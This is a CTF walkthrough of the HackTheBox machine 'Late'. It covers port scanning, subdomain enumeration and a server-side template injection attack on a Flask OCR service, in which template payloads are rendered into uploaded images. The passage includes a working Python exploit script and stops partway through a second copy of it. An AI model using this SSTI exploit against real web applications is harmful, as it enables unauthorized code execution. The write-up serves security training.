title = "Late | 0xbro"
description = '''20 Aug 2022 | Reading time: ~18 min HackTheBox - Late [Easy] #.pfx-files, #LAPS, #Windows, #anonymous-smb, #cracking-pfx-files, #cracking-zip-files, #credentials-in-LAPS, #credentials-in-history, #weak-credentials Table of contents Resolution summary Improved skills Used tools Information Gathering Enumeration Port 80 - HTTP (nginx 1.14.0 (Ubuntu)) late.htb images.late.htb Exploitation Server Side Template Injection Vulnerable code Privilege Escalation Local enumeration Relative Path Hijacking / Writable path abuse Trophy Resolution summary Web site enumeration reveled a sub-domain running a Flask Optical Character Recognition tool The application turned out to be vulnerable to SSTI and it was possible to obtain arbitrary code execution svc_acc was able to create files inside a $PATH folder, allowing to exploit a relative path hijacking vulnerabilities in a custom script and obtain code execution as root Improved skills Exploit Server Side Template Injection to execute arbitrary code Abuse Relative Path Hijacking vulnerabilities to elevate privileges Used tools nmap gobuster convert linpeas.sh Information Gathering Scanned all TCP ports: ┌──(maoutis㉿kali)-[~/CTF/HTB/Late] └─$ sudo nmap -p- -sS 10.10.11.156 -oN scan/all-tcp-ports.txt [sudo] password for maoutis: Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-10 14:58 CEST Nmap scan report for 10.10.11.156 Host is up (0.038s latency). Not shown: 65533 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 32.64 seconds Enumerated open TCP ports: ┌──(maoutis㉿kali)-[~/CTF/HTB/Late] └─$ sudo nmap -p22,80 -sV -sC -A -oN scan/open-tcp-ports.txt -sT 10.10.11.156 Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-10 15:00 CEST Nmap scan report for 10.10.11.156 Host is up (0.036s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA) | 256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA) |_ 256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Late - Best online image tools Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using proto 1/icmp) HOP RTT ADDRESS 1 34.85 ms 10.10.14.1 2 35.67 ms 10.10.11.156 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.73 seconds Enumeration Port 80 - HTTP (nginx 1.14.0 (Ubuntu)) Enumerated domain and added them to /etc/hosts: echo '10.10.11.156 late.htb images.late.htb' | sudo tee -a /etc/hosts late.htb Enumerated web directories and files: ┌──(maoutis㉿kali)-[~/CTF/HTB/Late] └─$ gobuster dir -u http://late.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 25 ... /index.html (Status: 200) [Size: 9461] /contact.html (Status: 200) [Size: 6364] /. (Status: 301) [Size: 194] [--> http://late.htb/./] ┌──(maoutis㉿kali)-[~/CTF/HTB/Late] └─$ gobuster dir -u http://late.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 25 ... /assets (Status: 301) [Size: 194] [--> http://late.htb/assets/] images.late.htb Browsed the domain: Transformed an image into text: ┌──(maoutis㉿kali)-[~/CTF/HTB/Late/exploit] └─$ cat results.txt 1 ⚙ <p></p> Generated an image containing some text inside: ┌──(maoutis㉿kali)-[~/CTF/HTB/Late/exploit] └─$ convert -background "#000000" -size 800x480 -fill "#ffffff" -pointsize 72 -gravity center label:'Some Text' output.png POST /scanner HTTP/1.1 Host: images.late.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------178752961334934490701098382232 Content-Length: 4346 Origin: http://images.late.htb Connection: close Referer: http://images.late.htb/ Upgrade-Insecure-Requests: 1 -----------------------------178752961334934490701098382232 Content-Disposition: form-data; name="file"; filename="output.png" Content-Type: image/png <raw_img_bytes> HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Tue, 10 May 2022 13:31:14 GMT Content-Type: text/plain; charset=utf-8 Content-Length: 17 Connection: close Content-Disposition: attachment; filename=results.txt Last-Modified: Tue, 10 May 2022 13:31:14 GMT Cache-Control: no-cache ETag: "1652189474.292456-17-369233444" <p>Some Text </p> Exploitation Server Side Template Injection The application, build using Flask, used templates to generates results.txt. A sample code of the implemented logic may be similar to the following one: from flask import Flask, render_template, request, url_for, Response import pytesseract import cv2 from PIL import Image @app.route('/scanner', methods=['GET', 'POST']) def upload(): try: imagefile = request.files.get('imagefile', '') img = Image.open(imagefile) text = pytesseract.image_to_string(img) f = open("sample.txt", "a") f.truncate(0) f.write(text) f.close() return render_template('result.html', var=text) except: return render_template('error.html') #result.txt <p></p> This thesis can be verified by passing a non destructive payload containing a Flask template and observing the behavior: ┌──(maoutis㉿kali)-[~/CTF/HTB/Late/exploit] └─$ convert -background "#000000" -size 800x480 -fill "#ffffff" -pointsize 72 -gravity center label:'\{\{5-2\}\}' output.png ... ┌──(maoutis㉿kali)-[~/CTF/HTB/Late/exploit] └─$ cat results.txt <p>3 </p> Because results.txt contained the value “3” it meant that the server executed the instruction contained inside the generated template. An exploit was developed to simplify the exploitation process: #!/home/maoutis/.pyenv/shims/python import requests, os from sys import argv if len(argv) < 3: print("Usage: python3 sendImg.py <url> <cmd>") exit() url = argv[1] cmd = argv[2] # Generating the image print("Generating the payload...") fullCmd = """/usr/bin/convert \ -background "#000000" \ -size 800x480 \ -fill "#ffffff" \ -font "/usr/share/fonts-firacode/woff/FiraCode-Light.woff" \ -pointsize 25 \ -gravity center \ label:'\{\{"""+cmd+"\}\}' /tmp/exploit.png" os.system(fullCmd) # Import the image f = open("/tmp/exploit.png","rb") # Multipart / File upload print(f"Uploading file to {url}") files = {'file': ("image.jpg", f, 'image/jpg')} resp = requests.post(url, files=files) # Output print("\n\nServer response: ") print(html.unescape(resp.content.decode())) Enumerated all the available classes in search of one that allows to execute remote code: #!/home/maoutis/.pyenv/shims/python import requests, os, html from sys import argv if len(argv) < 3: print("Usage: python3 sendImg.py <url> <cmd>") exit() url = argv[1] cmd = argv[2] # Generating the image print("Generating the payload...") fullCmd = """/usr/bin/convert \ -background "#000000" \ -size 2400x1080 \ -fill "#ffffff" \ -font "/usr/share/fonts-firacode/woff/FiraCode-Light.woff" \ -pointsize 25 \ -gravity center \ label:'\{\{"""+cmd+"\}\}' /tmp/exploit.png" os.system(fullCmd) # Import the image f = open("/tmp/exploit.png","rb") # Multipart / File upload print(f"Uploading file to {url}") files = {'file': ("image.jpg", f, 'image/jpg')} resp = requests.post(url, files=files) # Output print("\n\nServer response: ") #print(html.unescape(resp.content.decode()